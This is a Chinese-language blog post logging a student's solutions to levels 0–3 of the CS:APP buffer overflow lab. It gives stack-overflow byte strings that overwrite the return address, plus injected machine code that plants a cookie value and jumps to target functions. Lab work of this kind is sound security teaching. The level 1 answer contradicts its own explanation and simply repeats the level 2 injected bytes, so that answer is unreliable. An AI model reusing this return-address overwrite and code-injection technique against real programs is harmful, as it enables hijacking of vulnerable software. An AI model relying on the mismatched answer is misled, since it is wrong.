---
title: buffer lab
date: 2021-04-25 10:19:56
tags:
	csapp
---

buff lab 学习记录

<!--more-->

### level 0

由`getbu`f中的`0x08048fe6 <+6>: lea -0xc(%ebp),%eax`可知buf所在的地址为`%ebp-0xc`，由栈帧的结构可知`getbuf`中的返回地址保存在`%ebp+4`中，所以输入16个字节后输入的内容为smoke的地址`0x08048e20`

输入的内容为`64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 20 8e 04 08    `



### level 1

如同level 0，在`%ebp+4`(写入fizz的地址`0x08048dc0`，当推出getbuf函数后`%ebp`指向源`%ebp+8`,在fizz中执行完`push %ebp`后%ebp为源`%ebp+4`，根据`fizz 0x08048dc7 <+7>: mov 0x8(%ebp),%ebx`可知，val保存在源`%ebp+12`，所以在填完fizz的地址后4个字节开始数据cookie的值`0x113e5eb1`

输入的内容为`c7 05 dc a1 04 08 b1 5e 3e 11 68 60 8d 04 08 c3 2c b6 ff ff`



### level 2

`0x804a1dc`为global的地址，buf的地址为`0xffffb62c`，通过在buf处填入代码，再通过修改eip来使得getbuf return后返回buf处执行代码，其中填充的恶意代码为

```
movl $0x113e5eb1,0x804a1dc
pushl $0x08048d60
ret
```

意思为将global的值设为cookie，将bang函数的地址` $0x08048d60`压入栈，ret后返回bang函数处执行。
恶意代码地址为buf的地址：`0xffffb62c`
生成机器代码:

```
gcc -m32 -c l2_code.S
objdump -d l2_code.o > l2_code.d
```

l2_code.d中的内容为

```
00000000 <.text>:
0: c7 05 dc a1 04 08 b1 movl $0x113e5eb1,0x804a1dc
7: 5e 3e 11
a: 68 60 8d 04 08 push $0x8048d60
f: c3 ret
```

在l2.txt中填入`c7 05 dc a1 04 08 b1 5e 3e 11 68 60 8d 04 08 c3 2c b6 ff ff`



### level 3

跳到12行，要满足两个条件(1)local == 0xdeadbeef(2)val==cookie。由于使用了volatile关键字声明local，所以读local会直接从内存中读取而不是寄存器中读取，所以当函数执行完getbuf()返回test时%ebp必须和原来的相同，且getbuf返回cookie。
通过gdb查看test()中ebp的值为0xffffb658，getbuf返回后执行的下一条指令的地址为0x0804901e
插入的恶意代码为:

```
movl $0x113e5eb1,%eax
movl $0xffffb658,%ebp
pushl $0x0804901e
ret
```

最后生成l3_code.d中的内容为

```
Disassembly of section .text:

00000000 <.text>:
0: b8 b1 5e 3e 11 mov $0x113e5eb1,%eax
5: bd 58 b6 ff ff mov $0xffffb658,%ebp
a: 68 1e 90 04 08 push $0x804901e
f: c3 ret
```

输入:

```
b8 b1 5e 3e 11 bd 58 b6 ff ff 68 1e 90 04 08 c3 2c b6 ff ff
```

